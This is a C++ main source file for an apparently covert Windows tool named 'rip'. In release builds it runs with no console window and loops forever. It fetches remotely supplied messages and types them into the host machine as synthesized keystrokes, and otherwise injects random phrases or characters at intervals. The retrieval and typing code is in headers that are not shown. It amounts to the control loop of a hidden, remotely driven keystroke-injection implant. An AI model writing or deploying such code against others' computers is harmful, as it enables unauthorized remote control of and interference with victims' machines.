
#include "KeyTyper.h"
#include "MessageRetriever.h"
#include "RIP.h"
#include <iostream>
#include <thread>

#ifdef _DEBUG
int main(int argc, char* argv[])
#else
#include <Windows.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#endif
{
	rip::init();
	std::cout << "Computer Name: " << rip::MessageRetriever::getComputerName() << std::endl;
	std::this_thread::sleep_for(std::chrono::seconds(5));
	while(true)
	{
		bool new_msgs = false;
		if(rip::settings::retrieve)
		{
			std::cout << "checking messages" << std::endl;
			std::vector<std::string> msgs = rip::MessageRetriever::retrieveMessages();
			for(size_t msgs_size=msgs.size(), i=0; i<msgs_size; i++)
			{
				std::cout << "recieved message: " << msgs.at(i) << std::endl;
				rip::KeyTyper::typeString(msgs.at(i));
			}
			if(msgs.size()==0)
			{
				std::cout << "no new messages" << std::endl;
			}
			else
			{
				new_msgs = true;
			}
		}
		if(rip::settings::random && !new_msgs)
		{
			double randNum = (double)((double)rand()/((double)RAND_MAX+1));
			if(randNum<=rip::settings::random_chance)
			{
				if(rip::settings::phrases.size()>0)
				{
					size_t randIndex = (size_t)(((double)rand()/((double)RAND_MAX+1))*rip::settings::phrases.size());
					std::string phrase = rip::settings::phrases[randIndex];
					rip::KeyTyper::typeString(phrase);
					std::cout << "typed: " << phrase << std::endl;
				}
				else
				{
					char randChar = (char)(32 + (((double)rand()/((double)RAND_MAX+1))*(127-32)));
					rip::KeyTyper::typeChar(randChar);
					std::cout << "typed: " << randChar << std::endl;
				}
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(rip::settings::refresh_interval));
	}
    return 0;
}
